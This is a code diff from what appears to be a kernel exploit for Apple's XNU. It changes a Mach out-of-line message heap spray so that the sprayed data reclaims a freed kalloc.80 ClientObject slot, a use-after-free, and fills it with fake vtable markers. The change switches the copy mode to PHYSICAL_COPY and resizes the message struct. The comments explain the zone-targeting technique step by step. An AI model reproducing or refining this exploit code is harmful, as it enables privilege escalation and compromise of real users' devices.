@@ -3520,17 +3520,15 @@ static const char kOpenPropertiesGarbage[] =
                      kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];
 
     // ---- Mach OOL spray setup (kalloc.80 reclaim) ----
-    // Kernel copies each sent message to a buffer in the port queue, allocated from
-    // kalloc at msgh_size bytes. We pad OOLMsg to 72 bytes so messages land in the
-    // kalloc.80 zone (65-80 bytes) — same zone as ClientObject (~72 bytes).
-    // The spray thread cycles recv→send: each recv frees a kalloc.80 slot, each send
-    // allocates a new one. kalloc's LIFO freelist means the send right after
-    // ClientObject is freed reclaims that exact slot, now filled with our markers.
+    // PHYSICAL_COPY forces the kernel to kalloc+copy the OOL data (72B, with our
+    // fake vtable markers at offset 0 → kalloc.80). The message buffer itself has
+    // no padding (~44B → kalloc.64) so it doesn't compete for kalloc.80 slots.
+    // When ClientObject (~72B, kalloc.80) is freed, the next send's OOL data copy
+    // allocation reclaims that exact slot (LIFO), filling it with our markers.
     typedef struct {
         mach_msg_header_t header;        // 24 bytes
         mach_msg_body_t body;            //  4 bytes
-        mach_msg_ool_descriptor_t ool;   // 28 bytes
-        uint64_t _pad[4];                // 32 bytes → total 80B → kalloc.80
+        mach_msg_ool_descriptor_t ool;   // 16 bytes → total ~44B → kalloc.64
     } OOLMsg;
 
     // Mach port default queue limit is 5. We pre-fill exactly 5 messages to stay
@@ -3572,7 +3570,7 @@ static const char kOpenPropertiesGarbage[] =
                 msg.ool.address = sprayPayload;
                 msg.ool.size = kOolDataSize;
                 msg.ool.deallocate = FALSE;
-                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                 if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
                     sent++;
                 }
@@ -3638,7 +3636,7 @@ static const char kOpenPropertiesGarbage[] =
                 sndMsg.ool.address = sprayPayload;
                 sndMsg.ool.size = kOolDataSize;
                 sndMsg.ool.deallocate = FALSE;
-                sndMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                sndMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                 mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
 
                 // RECV second — frees one slot to make room for next send
